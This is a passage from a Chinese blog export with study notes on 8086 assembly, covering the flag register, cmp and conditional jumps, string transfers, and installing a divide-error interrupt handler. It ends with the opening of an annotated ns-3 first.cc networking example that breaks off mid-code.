<p>现实问题比较复杂，对现实问题进行分析时，把它转化为相互联系、不同层次的子问题，是必须的解决方法。</p>
</blockquote>
<p>在高级语言中的函数或者方法就是这种思想的体现。在汇编语言中我们将高级语言中的方法或函数称之为子程序。</p>
<h3 id="10-10-参数和结果传递的问题"><a href="#10-10-参数和结果传递的问题" class="headerlink" title="10.10 参数和结果传递的问题"></a><strong>10.10 参数和结果传递的问题</strong></h3><p>当我们设计子程序时面临两个问题：</p>
<p>（1）参数存放的位置？<br>（2）计算结果存放的位置？  </p>
<p>实际上，我们可以将参数及结果存放于任何可以存储数据的地方。一般情况下，我们可以将参数存储在寄存器中，也可以存储在普通内存单元中。更一般的做法我们将其存储在栈中进行传递。</p>
<h3 id="10-11-寄存器冲突的问题"><a href="#10-11-寄存器冲突的问题" class="headerlink" title="10.11 寄存器冲突的问题"></a><strong>10.11 寄存器冲突的问题</strong></h3><p>寄存器数量是有限的，子程序中使用的寄存器，很可能在主程序中也要使用，造成了寄存器使用上的冲突。解决这个问题的简捷方法是，<strong>在子程序的开始将子程序中所有用到的寄存器中的内容都保存起来，在子程序返回前再恢复。</strong> 可以用栈来保存寄存器中的内容。</p>
<p>栈是临时保存数据的一个比较理想的数据结构。</p>
<hr>
<h2 id="第十一章-标志寄存器"><a href="#第十一章-标志寄存器" class="headerlink" title="第十一章 标志寄存器"></a><strong>第十一章 标志寄存器</strong></h2><p>标志寄存器(Flag Register)是我们8086CPU14个寄存器中最为复杂的一个。其他13个寄存器一般用于存放数据，整个寄存器具有一个含义。而flag寄存器是按位起作用的。</p>
<p>这一章中我们主要学习CF、PF、ZF、SF、OF、DF等标记位，以及其相关部分指令。</p>
<h3 id="11-1-ZF标志"><a href="#11-1-ZF标志" class="headerlink" title="11.1 ZF标志"></a><strong>11.1 ZF标志</strong></h3><p>Zero Flag，零标记位。用于记录相关指令执行后，其结果是否为0。如果结果为0，则ZF&#x3D;1，如果结果非0，则ZF&#x3D;0。</p>
<p>需要特别注意的是：</p>
<blockquote>
<p>在8086的指令集中，有的指令的执行是影响标志寄存器的，比如，add、sub、mul、div、inc、or、and等，它们大都是运算指令（进行逻辑或算术运算）；有的指令的执行对标志寄存器没有影响，比如mov、push、pop等，它们大都是传送指令。</p>
</blockquote>
<h3 id="11-2-PF标志"><a href="#11-2-PF标志" class="headerlink" title="11.2 PF标志"></a><strong>11.2 PF标志</strong></h3><p>Parity Flag，奇偶标记位。它用于记录相关指令执行后，其结果的所有bit位中1的个数是否为偶数。如果1的个数为偶数，则pf&#x3D;1，如果为奇数，则pf&#x3D;0。</p>
<h3 id="11-3-SF标志"><a href="#11-3-SF标志" class="headerlink" title="11.3 SF标志"></a><strong>11.3 SF标志</strong></h3><p>Sign Flag，符号标记位。它用于记录相关指令执行后，其结果是否为负。如果结果为负，则SF&#x3D;1，如果结果非负，则SF&#x3D;0。</p>
<p>计算机中通常用补码来表示有符号数，补码在形式上与普通的无符号二进制数据并无差异。也即是说，给定的一个二进制数，我们既可以把它当做有符号数的补码形式，也可以当做一个无符号数。对于计算机来说，无论是无符号数还是有符号数的补码形式，在计算方式上并无差异（补码的符号位同样参与运算）。</p>
<p>SF标志，就是CPU对<strong>有符号数</strong>运算结果的一种记录，它记录数据的正负。在我们将数据当做有符号数来运算的时候，可以通过它来得知结果的正负。如果我们将数据当做无符号数来运算，SF的值则没有意义，虽然相关指令影响了它的值。</p>
<h3 id="11-4-CF标志"><a href="#11-4-CF标志" class="headerlink" title="11.4 CF标志"></a><strong>11.4 CF标志</strong></h3><p>Carry Flag，进位标志位。一般情况下，在进行<strong>无符号数运算</strong>的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值。</p>
<h3 id="11-5-OF标志"><a href="#11-5-OF标志" class="headerlink" title="11.5 OF标志"></a><strong>11.5 OF标志</strong></h3><p>Overflow Flag，溢出标志位。在进行<strong>有符号数运算</strong>的时候，如果计算结果超出了机器所能表示的范围则发生溢出，此时OF&#x3D;1。否则，OF&#x3D;0。</p>
<p>注意区分CF和OF的区别：CF是对无符号数运算有意义的标志位，OF是对有符号数运算有意义的标志位。</p>
<h3 id="11-6-adc指令"><a href="#11-6-adc指令" class="headerlink" title="11.6 adc指令"></a><strong>11.6 adc指令</strong></h3><p>adc是带进位加法指令，它利用了CF位上记录的进位值。</p>
<p>指令格式：</p>
<blockquote>
<p>adc 操作对象1，操作对象2</p>
</blockquote>
<p>功能：操作对象1&#x3D;操作对象1+操作对象2+CF</p>
<p>比如指令 adc ax,bx 实现的功能是：（ax）&#x3D; （ax）+ （bx）+ CF</p>
<p>既然我们已经有了add指令，那为什么还要设计adc指令呢？</p>
<p>设想一下，之前我们使用add指令做加法运算的时候，相加结果都是16位以内，如果和大于16位就会产生误差。adc指令目的就是对任意大的数据进行加法运算。自习观察加法运算可以得到如下规律：</p>
<p>任意大的加法运算都可以分解为多步进行，低位相加，高位相加再加上低位相加产生的进位值，直至所有位都相加完毕。</p>
<p>使用adc指令结合上述规律就可以实现对任意大的数据进行加法运算。</p>
<h3 id="11-7-sbb指令"><a href="#11-7-sbb指令" class="headerlink" title="11.7 sbb指令"></a><strong>11.7 sbb指令</strong></h3><p>sbb是带借位减法指令，它利用了CF位上记录的错位值。</p>
<p>指令格式：</p>
<blockquote>
<p>sbb 操作对象1，操作对象2</p>
</blockquote>
<p>功能：操作对象1&#x3D;操作对象1-操作对象2-CF。</p>
<p>sbb指令和adc指令是基于同样的思想设计的两条指令，在应用思路上和adc指令类似。</p>
<h3 id="11-8-cmp指令"><a href="#11-8-cmp指令" class="headerlink" title="11.8 cmp指令"></a><strong>11.8 cmp指令</strong></h3><p>cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。cmp指令执行后，将对标志寄存器产生影响。</p>
<p>指令格式：</p>
<blockquote>
<p>cmp 操作对象1，操作对象2</p>
</blockquote>
<p>功能：计算操作对象 1 - 操作对象 2 但并不保存结果，仅仅根据计算结果对标志寄存器进行设置。</p>
<p>利用 cmp ax, bx 指令对两个无符号数ax和bx进行比较，如果执行后：</p>
<p>zf &#x3D; 1，说明 (ax) &#x3D; (bx)<br>zf &#x3D; 0，说明 (ax) ≠ (bx)<br>cf &#x3D; 1，说明 (ax) &lt; (bx)<br>cf &#x3D; 0，说明 (ax) ≥ (bx)<br>cf &#x3D; 0 并且 zf &#x3D; 0，说明 (ax) &gt; (bx)<br>cf &#x3D; 1 或 zf &#x3D; 1，说明 (ax) ≤ (bx)  </p>
<p>利用 cmp ah,bh 指令对两个有符号数ah和bh进行比较，由于有符号数的比较较为复杂，主要是考虑到溢出的特殊情景，我们分类讨论：</p>
<p>（1） 如果 sf &#x3D; 1 并且 of &#x3D; 0</p>
<p>of &#x3D; 0 说明没有溢出，并且 sf &#x3D; 1 说明逻辑上真正的结果为负数。所以 (ah) &lt; (bh)。</p>
<p>（2） 如果 sf &#x3D; 1 并且 of &#x3D; 1</p>
<p>of &#x3D; 1 说明存在溢出，<strong>针对补码求和来说，如果结果非0并且产生溢出，正确的逻辑结果符号与实际的结果符号必然相反。</strong> sf &#x3D; 1 说明实际结果为负，那么正确的逻辑结果应该为正。所以 (ah) &gt; (bh)。</p>
<p>（3） 如果 sf &#x3D; 0 并且 of &#x3D; 1</p>
<p>of &#x3D; 1 说明存在溢出，<strong>针对补码求和来说，如果结果非0并且产生溢出，正确的逻辑结果符号与实际的结果符号必然相反。</strong> sf &#x3D; 0说明实际运算结果必然不小于0，因为存在溢出所以实际运算结果必不等于0，所以实际运算结果必然大于0，进而推导出正确的逻辑运算结果必然小于0。所以 (ah) &lt; (bh)。</p>
<p>（4） 如果 sf &#x3D; 0 并且 of &#x3D; 0</p>
<p>of &#x3D; 0 说明没有溢出，并且 sf &#x3D; 0，说明逻辑上真正的结果为非负数。所以 (ah) ≥ (bh)。</p>
<p>（5） 如果 zf &#x3D; 1</p>
<p>这种情形比较简单。此时 (ah) &#x3D; (bh)。</p>
<h3 id="11-9-检测比较结果的条件转移指令"><a href="#11-9-检测比较结果的条件转移指令" class="headerlink" title="11.9 检测比较结果的条件转移指令"></a><strong>11.9 检测比较结果的条件转移指令</strong></h3><p>“转移”指的是它能够修改IP，而“条件”指的是它可以根据某种条件，决定是否修改IP。比如，jcxz就是一个条件转移指令，它可以检测cx中的数值，如果 (cx) &#x3D; 0，就修改IP，否则什么也不做。<strong>所有条件转移指令的位移都是 [-128, 127]（即它们都是短转移）。</strong></p>
<p>jcxz是根据寄存器cx的值来判断是否转移，除此之外还存在其他条件转移指令，大多数条件转移指令都检测标志寄存器相关标志位，根据检测的结果来决定是否修改IP。</p>
<p>下表列出了常用的根据无符号数的比较结果进行转移的条件转移指令：</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>含义</th>
<th>检测的相关标志位</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>je</td>
<td>等于则转移</td>
<td>zf &#x3D; 1</td>
<td>e 表示 equal</td>
</tr>
<tr>
<td>jne</td>
<td>不等于则转移</td>
<td>zf &#x3D; 0</td>
<td>ne 表示 not eauql</td>
</tr>
<tr>
<td>jb</td>
<td>低于则转移</td>
<td>cf &#x3D; 1</td>
<td>b 表示 below</td>
</tr>
<tr>
<td>jnb</td>
<td>不低于则转移</td>
<td>cf &#x3D; 0</td>
<td>nb 表示 not blow</td>
</tr>
<tr>
<td>ja</td>
<td>高于则转移</td>
<td>cf &#x3D; 0 且 zf &#x3D; 0</td>
<td>a 表示 above</td>
</tr>
<tr>
<td>jna</td>
<td>不高于则转移</td>
<td>cf &#x3D; 1 或 zf &#x3D; 1</td>
<td>na 表示 not above</td>
</tr>
</tbody></table>
<p>注意，条件转移指令通常与cmp指令配合使用。</p>
<h3 id="11-10-DF标志和串传送指令"><a href="#11-10-DF标志和串传送指令" class="headerlink" title="11.10 DF标志和串传送指令"></a><strong>11.10 DF标志和串传送指令</strong></h3><p>Direction Flag，方向标志位。在串传送指令中，控制每次操作后 si、di 的增减。</p>
<p>df &#x3D; 0 ，每次操作后 si、di 递增；<br>df &#x3D; 1 ，每次操作后 si、di 递减。</p>
<p>下面，我们学习几个常见的串传送指令。（写到这里，突然想吃羊肉串了~~）</p>
<p><strong>movsb指令</strong></p>
<p>格式：</p>
<blockquote>
<p>movsb</p>
</blockquote>
<p>功能：将ds:si指向的内存单元中的字节送入es:di中，并根据标志寄存器df的值，将si和di递增或递减。<br><strong>movsw指令</strong></p>
<p>与 movsb 指令类似，只不过 movsw指令传送的是一个字单元。</p>
<p><strong>rep 指令</strong></p>
<p>本人将其翻译为重复指令（repetition）。movsb 和 movsw 进行的是串传送操作中的一个步骤，一般来说，movsb 和 movsw 都配合 rep 配合使用，格式如下：</p>
<blockquote>
<p>rep movsb</p>
</blockquote>
<p>功能：根据cx的值来决定是否重复执行 movsb操作。使用汇编语法来描述就是&gt;</p>
<blockquote>
<p>s: movsb<br>  loop s</p>
</blockquote>
<p><strong>cld 指令和 std 指令</strong></p>
<p>cld 指令：将标志寄存器的 df 位置0；<br>std 指令：将标志寄存器的 df 位置1。</p>
<p>为了方便记忆，可以将 cld 理解为 clear direction 的缩写，将 std 理解为 set direction 的缩写。</p>
<h3 id="11-11-pushf-和-popf"><a href="#11-11-pushf-和-popf" class="headerlink" title="11.11 pushf 和 popf"></a><strong>11.11 pushf 和 popf</strong></h3><p> pushf 的功能是将标志寄存器的值压栈，而 popf 是从栈中弹出数据，送入标志寄存器中。</p>
<p>pushf 和 popf 为直接访问标志寄存器提供了一种方法。</p>
<h3 id="11-12-标志寄存器在Debug中的表示"><a href="#11-12-标志寄存器在Debug中的表示" class="headerlink" title="11.12 标志寄存器在Debug中的表示"></a><strong>11.12 标志寄存器在Debug中的表示</strong></h3><p>在Debug中，我们使用r命令查看寄存器详情，第二行最后几个双字符字母即是标志寄存器中各标志位的值。</p>
<hr>
<h2 id="第十二章-内中断"><a href="#第十二章-内中断" class="headerlink" title="第十二章 内中断"></a><strong>第十二章 内中断</strong></h2><p>什么是中断？如果你学习过高级编程语言，可以将中断理解为异常的特殊处理过程，就像Java里面的Exception。</p>
<p>任何一个通用的CPU，都具备一种能力，可以在执行完当前正在执行的指令之后，检测从CPU外部发送过来的或内部产生的一种特殊信息，并且可以立即对所收到的信息进行处理。这种特殊信息，我们可以称其为：中断信息。中断的意思是指，CPU不在接着(刚执行完的指令)向下执行，而是转去处理这个特殊信息。</p>
<p>中断信息可以来自CPU内部和外部，这一章，我们主要讨论来自CPU内部的中断信息，我们称之为内中断。</p>
<h3 id="12-1-内中断的产生"><a href="#12-1-内中断的产生" class="headerlink" title="12.1 内中断的产生"></a><strong>12.1 内中断的产生</strong></h3><p>8086CPU使用单元字节大小的数字来标识中断类型。</p>
<p>CPU内部可能产生多种多样的中断，那么应该如何来标识是哪种中断呢，或者说我们如何确定中断源？<br>8086CPU用称为<strong>中断类型码</strong>的数据来标识中断信息的来源。中断类型码为一个字节型数据，可以表示256种中断类型。以后，我们将产生中断信息的事件，即中断信息的来源，称之为<strong>中断源</strong>。</p>
<h3 id="12-2-中断处理程序"><a href="#12-2-中断处理程序" class="headerlink" title="12.2 中断处理程序"></a><strong>12.2 中断处理程序</strong></h3><p>处理中断信息的程序被称为<strong>中断处理程序</strong>。</p>
<h3 id="12-3-中断向量表"><a href="#12-3-中断向量表" class="headerlink" title="12.3 中断向量表"></a><strong>12.3 中断向量表</strong></h3><p>中断发生后，CPU要根据中断类型码去执行对应的中断处理程序？但如何根据8位的中断类型码得到中断处理程序的地址呢？</p>
<p>实际上，8086CPU用8位的中断类型码通过<strong>中断向量表</strong>找到相应的中断处理程序的入口地址。中断向量表就是中断处理程序入口地址的列表，列表的下标索引（从0开始）即是中断类型码的值。中断向量表实际上是中断类型码与中断处理程序入口地址之间的一种映射关系。可以理解为高级编程语言中的Map集合。</p>
<p>8086CPU中断向量表指定放在内存0处。每个表项占用4个字节，高位字存放段地址，低位字存放偏移地址。</p>
<h3 id="12-4-中断过程"><a href="#12-4-中断过程" class="headerlink" title="12.4 中断过程"></a><strong>12.4 中断过程</strong></h3><p>用中断类型码找到中断向量，并用它设置CS和IP的值，这个工作是由CPU的硬件自动完成的。CPU硬件完成这个工作的过程被称为<strong>中断过程</strong>。中断过程完成后，CPU就会开始执行中断处理程序。中断过程可以理解为中断环境的初始化。那么在CPU进行中断过程中需要准备哪些工作呢？概括来说，主要进行以下六步准备工作：</p>
<p>（1）(从中断信息中)取得中断类型码；<br>（2）标志寄存器的值入栈(因为在中断过程中要改变标志寄存器的值，所以先将其保存在栈中)；<br>（3）设置标志寄存器的第8位TF和第9位IF的值为0(这一步的目的后面将介绍)；<br>（4）CS的内容入栈；<br>（5）IP的内容入栈；<br>（6）从内存地址为中断类型码<em>4和中断类型码</em>4+2的两个字单元中读取中断处理程序的入口地址设置IP和CS。</p>
<h3 id="12-5-中断处理程序和iret指令"><a href="#12-5-中断处理程序和iret指令" class="headerlink" title="12.5 中断处理程序和iret指令"></a><strong>12.5 中断处理程序和iret指令</strong></h3><p>中断处理程序必须一直存储在指定内存中，以应对随时可能发生的中断事件。</p>
<p>中断处理程序的编写方法和子程序比较相似，下面是常规步骤：</p>
<p>（1）保存用到的寄存器；<br>（2）处理中断；<br>（3）恢复用到的寄存器；<br>（4）用ret指令返回。  </p>
<p>iret指令的功能用汇编语法描述为：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">pop IP</span><br><span class="line">pop CS</span><br><span class="line">popf</span><br></pre></td></tr></table></figure></div>
<p>在中断过程中，注意标志寄存器入栈和出栈的次序。入栈顺序是标志寄存器、CS、IP，出栈顺序与此相反。</p>
<h3 id="12-6-除法错误中断的处理"><a href="#12-6-除法错误中断的处理" class="headerlink" title="12.6 除法错误中断的处理"></a><strong>12.6 除法错误中断的处理</strong></h3><p>除法错误将引发0号中断。至于为何是0号中断，我估摸着除法中断时人们最容易想到也最容易遇到的中断了吧。</p>
<h3 id="12-7-编程处理0号中断"><a href="#12-7-编程处理0号中断" class="headerlink" title="12.7 编程处理0号中断"></a><strong>12.7 编程处理0号中断</strong></h3><p>我们的需求是重新编写一个0号中断处理程序，它的功能是在屏幕中间显示“overflow!”，然后返回到操作系统。</p>
<p>为了满足以上需求，需要做一下几件事情：</p>
<p>（1）编写可以显示“overflow”的中断处理程序：do0；<br>（2）将do0送入内存0000:0200处；<br>（3）将do0的入口地址0000:0200存储在中断向量表0号表项中。  </p>
<p>程序的框架如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start:  do0安装程序</span><br><span class="line">        设置中断向量表</span><br><span class="line">        mov ax, <span class="number">4</span>c00h</span><br><span class="line">        <span class="type">int</span> <span class="number">21</span>h</span><br><span class="line"></span><br><span class="line">do0:    显示字符串<span class="string">&quot;overflow&quot;</span></span><br><span class="line">        mov ax, <span class="number">4</span>c00h</span><br><span class="line">        <span class="type">int</span> <span class="number">21</span>h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure></div>

<p>下面摘抄书中比较精辟的一段总结：</p>
<blockquote>
<p>我们如何让一个内存单元成为栈顶？将它的地址放入SS、SP中；<br>我们如何让一个内存单元中的信息被CPU当做指令来执行？将它的地址放入CS、IP中；<br>我们如何让一个内存单元成为要处理的数据？将它的段地址放在DS中；(书中无这句话，个人根据理解补充)<br>那么，我们如何让一段程序成为 N 号中断的中断处理程序呢？将它的入口地址放入中断向量表的 N 好表项中。  </p>
</blockquote>
<h3 id="12-8-安装"><a href="#12-8-安装" class="headerlink" title="12.8 安装"></a><strong>12.8 安装</strong></h3><p>所谓安装就是将中断处理程序(do0)送到指定内存处。</p>
<p>我们可以使用movsb指令，将do0的代码送入0:200处。复习一下movsb的用法：movsb是串传送指令，其功能是将ds:si指向的内存单元中的字节送入es:di中，并根据标志寄存器df的值，将si和di递增或递减。movsb指令往往与rep指令配合使用来实现批量字符串的传送。</p>
<p>安装程序的框架如下所示：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start:  设置es:di指向目的地址</span><br><span class="line">        设置ds:si指向源地址</span><br><span class="line">        设置cx为传输长度</span><br><span class="line">        设置传输方向为正</span><br><span class="line">        rep movsb</span><br><span class="line"></span><br><span class="line">        设置中断向量表</span><br><span class="line"></span><br><span class="line">        mov ax, <span class="number">4</span>c00h</span><br><span class="line">        <span class="type">int</span> <span class="number">21</span>h</span><br><span class="line"></span><br><span class="line">do0:    显示字符串<span class="string">&quot;overflow!&quot;</span></span><br><span class="line">        mov ax, <span class="number">4</span>c00h</span><br><span class="line">        <span class="type">int</span> <span class="number">21</span>h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>以上步骤的难点在于如何确认中断处理程序do0的长度？最笨的方法是计算do0中每句代码的长度，然后累加，但这样做太麻烦了，不仅要知道每行代码所占的字节数，代码稍有改动那就令人抓狂。书中作者给出一个非常简便的计算方式，利用编译器来帮助我们计算do0的长度。之前我们学过offset指令，他的功能是取得标号的偏移地址，我们在do0后面在添加一个标号do0end，使用 offset do0end - offset do0 即可计算出do0的长度。</p>
<p>解决了字符传送以及确认do0长度这两个拦路虎后，我们就可以看一下较为完整的安装程序代码了：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:  </span><br><span class="line">        mov ax, cs</span><br><span class="line">        mov ds, ax</span><br><span class="line">        mov si, offset do0        ;设置ds:si指向源地址</span><br><span class="line">        mov ax, <span class="number">0</span></span><br><span class="line">        mov es, ax                </span><br><span class="line">        mov di, <span class="number">0200</span>h             ;设置es:di指向目标地址</span><br><span class="line"></span><br><span class="line">        mov cx, offset do0end - offset do0  ;设置cx为传输长度</span><br><span class="line">        cld                                 ;设置传输方向为正</span><br><span class="line">        rep movsb                           ;传输开始</span><br><span class="line"></span><br><span class="line">        设置中断向量表</span><br><span class="line"></span><br><span class="line">        mov ax, <span class="number">4</span>c00H</span><br><span class="line">        <span class="type">int</span> <span class="number">21</span>H</span><br><span class="line"></span><br><span class="line">do0:    显示字符串<span class="string">&quot;overflow!&quot;</span></span><br><span class="line">        mov ax, <span class="number">4</span>c00h</span><br><span class="line">        <span class="type">int</span> <span class="number">21</span>h</span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这里补充一点，像”+”、”-“、”*“、”&#x2F;“、”offset”这类指令都是伪指令，并不是标准的汇编指令，它是由编译器识别并由编译器翻译为对应的汇编指令。</p>
<h3 id="12-9-do0"><a href="#12-9-do0" class="headerlink" title="12.9 do0"></a><strong>12.9 do0</strong></h3><p>do0程序即是我们的0号中断处理程序。其主要目的是显示字符串”overflow!”。</p>
<p>主要程序代码如下所示：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">do0:    jum <span class="type">short</span> do0start</span><br><span class="line">        db <span class="string">&#x27;overflow!&#x27;</span></span><br><span class="line"></span><br><span class="line">do0start: mov ax, cs</span><br><span class="line">          mov ds, ax</span><br><span class="line">          mov si, <span class="number">202</span>h</span><br><span class="line"></span><br><span class="line">          mov ax, <span class="number">0b</span>800h</span><br><span class="line">          mov es, ax</span><br><span class="line">          mov di, <span class="number">12</span>*<span class="number">160</span> + <span class="number">36</span>*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">          mov cx, <span class="number">9</span></span><br><span class="line">        s:mov al, [si]</span><br><span class="line">          mov es:[di], al</span><br><span class="line">          inc si</span><br><span class="line">          add di, <span class="number">2</span></span><br><span class="line">          loop s</span><br><span class="line"></span><br><span class="line">          mov ax, <span class="number">4</span>c00h</span><br><span class="line">          <span class="type">int</span> <span class="number">21</span>h</span><br><span class="line"></span><br><span class="line">do0end:   nop</span><br></pre></td></tr></table></figure></div>

<p>这部分代码需要注意的地方是，我们在子程序do0开始处定义了字符串”overflow!”，但它并不是可以执行的代码，所以在”overflow!”之前加上一条jmp指令，转移到正式的do0程序。</p>
<h3 id="12-10-设置中断向量"><a href="#12-10-设置中断向量" class="headerlink" title="12.10 设置中断向量"></a><strong>12.10 设置中断向量</strong></h3><p>设置中断向量，也即是将中断处理程序do0在内存中的入口地址存放在中断向量表0号表项中。0号表项的地址为0:0，其中0:0字单元存放中断处理程序入口地址的偏移地址，0:2字单元存放中断处理程序入口地址的段地址。程序如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">mov ax, <span class="number">0</span></span><br><span class="line">mov es, ax</span><br><span class="line">mov word ptr es:[<span class="number">0</span>*<span class="number">4</span>], <span class="number">200</span>h</span><br><span class="line">mov word ptr es:[<span class="number">0</span>*<span class="number">4</span>+<span class="number">2</span>], <span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<h3 id="12-11-单步中断"><a href="#12-11-单步中断" class="headerlink" title="12.11 单步中断"></a><strong>12.11 单步中断</strong></h3><p>基本上，在CPU执行完一条指令之后，如果检测到标志寄存器的TF位为1，则产生单步中断，引发中断过程。单步中断的中断类型码为1。在一开始我们说CPU在执行中断处理程序之前要先将标志寄存器TF位置0，这就是为了防止CPU在执行1号类型中断(单步中断)时无限递归执行中断。</p>
<p>CPU提供单步中断功能的出发点是，为单步跟踪程序的执行过程，提供了实现机制。</p>
<h3 id="12-12-响应中断的特殊情况"><a href="#12-12-响应中断的特殊情况" class="headerlink" title="12.12 响应中断的特殊情况"></a><strong>12.12 响应中断的特殊情况</strong></h3><blockquote>
<p>一般情况下，CPU在执行完当前指令后，如果检测到中断信息，就响应中断，引发中断过程。可是，在有些情况下，CPU执行完当前指令后，即便是发生中断，也不会响应。例如针对ss修改执行后，下一条指令(一般是修改sp)也会紧接着执行，中间即使发生中断，CPU也不会去响应。这样做的主要原因是，ss:sp联合指向栈顶，而对它们的设置应该连续完成。如果在执行完设置ss的指令后，CPU响应中断，引发中断过程，要在栈中压入标志寄存器、CS和IP的值，而ss改变，sp并未改变，<strong>ss:sp指向的不是正确的栈顶</strong>，将引起错误。</p>
</blockquote>
<p>这种理念在高级编程语言中的具体体现是“原子操作”，即一组操作要么不执行，要么就一次执行完毕，不会存在中间状态。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>【学习笔记】ns3 官方例程first.cc的理解</title>
    <url>/2023/10/19/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91ns3%20%E5%AE%98%E6%96%B9%E4%BE%8B%E7%A8%8Bfirst.cc%E7%9A%84%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<p><strong><a class="link"   href="https://www.nsnam.org/docs" >官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ns3/core-module.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ns3/network-module.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ns3/internet-module.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ns3/point-to-point-module.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ns3/applications-module.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> ns3; <span class="comment">//使用 ns3 的命名空间</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">NS_LOG_COMPONENT_DEFINE</span> (<span class="string">&quot;FirstScriptExample&quot;</span>); <span class="comment">//定义一个名为FirstScriptExample的日志组件</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  CommandLine cmd;</span><br><span class="line">  cmd.<span class="built_in">Parse</span> (argc, argv); <span class="comment">//接受 shell 参数</span></span><br><span class="line">  </span><br><span class="line">  Time::<span class="built_in">SetResolution</span> (Time::NS); <span class="comment">//更改全局的 Time 对象时间分辨率为纳秒，所有时间都将转换为 ns</span></span><br><span class="line">  <span class="built_in">LogComponentEnable</span> (<span class="string">&quot;UdpEchoClientApplication&quot;</span>, LOG_LEVEL_INFO);</span><br><span class="line">  <span class="built_in">LogComponentEnable</span> (<span class="string">&quot;UdpEchoServerApplication&quot;</span>, LOG_LEVEL_INFO); <span class="comment">//日志组件记录 Udp 的服务器和客户端，记录等级为 INFO</span></span><br><span class="line"></span><br><span class="line">  NodeContainer nodes; <span class="comment">//创建一个Node容器nodes</span></span><br><span class="line">  nodes.<span class="built_in">Create</span> (<span class="number">2</span>); <span class="comment">//nodes容器创建两个Node</span></span><br><span class="line"></span><br><span class="line">  PointToPointHelper pointToPoint; <span class="comment">//创建一个PtP NetDevice的 Helper </span></span><br><span class="line">  pointToPoint.<span class="built_in">SetDeviceAttribute</span> (<span class="string">&quot;DataRate&quot;</span>, <span class="built_in">StringValue</span> (<span class="string">&quot;5Mbps&quot;</span>));</span><br><span class="line">  pointToPoint.<span class="built_in">SetChannelAttribute</span> (<span class="string">&quot;Delay&quot;</span>, <span class="built_in">StringValue</span> (<span class="string">&quot;2ms&quot;</span>)); <span class="comment">//将该 PtP 网络设备的速率设置为5Mbps，信道时延为 2ms</span></span><br><span class="line"></span><br><span class="line">  NetDeviceContainer devices; <span class="comment">//创建一个 NetDevice 容器</span></span><br><span class="line">  devices = pointToPoint.<span class="built_in">Install</span> (nodes); <span class="comment">//将 PtP NetDevice 安装到 nodes 中，并将这组 PtP 的网络设备赋值给 devices</span></span><br><span class="line"></span><br><span class="line">  InternetStackHelper stack; <span class="comment">//定义一个 internet 协议栈</span></span><br><span class="line">  stack.<span class="built_in">Install</span> (nodes); <span class="comment">//将该协议栈安装到 nodes 容器中的所有 node (的 NetDevice??)上</span></span><br><span class="line"></span><br><span class="line">  Ipv4AddressHelper address; <span class="comment">//定义一个 ipv4 的 Helper，方便快速分配ipv4 address</span></span><br><span class="line">  address.<span class="built_in">SetBase</span> (<span class="string">&quot;10.1.1.0&quot;</span>, <span class="string">&quot;255.255.255.0&quot;</span>); <span class="comment">//ipv4 网段为 10.1.1.0，子网掩码为 255.2555.255.0</span></span><br><span class="line"></span><br><span class="line">  Ipv4InterfaceContainer interfaces = address.<span class="built_in">Assign</span> (devices); <span class="comment">//为 NetDevice 分配 ip 地址并赋值给 interfaces</span></span><br><span class="line"></span><br><span class="line">  <span class="function">UdpEchoServerHelper <span class="title">echoServer</span> <span class="params">(<span class="number">9</span>)</span></span>; <span class="comment">//设置 udp 服务器的端口为 9</span></span><br><span class="line"></span><br><span class="line">  ApplicationContainer serverApps = echoServer.<span class="built_in">Install</span> (nodes.<span class="built_in">Get</span> (<span class="number">1</span>)); <span class="comment">//在 node1 上安装 udp 服务器应用程序</span></span><br><span class="line">  serverApps.<span class="built_in">Start</span> (<span class="built_in">Seconds</span> (<span class="number">1.0</span>)); <span class="comment">//udp 服务器在 1s 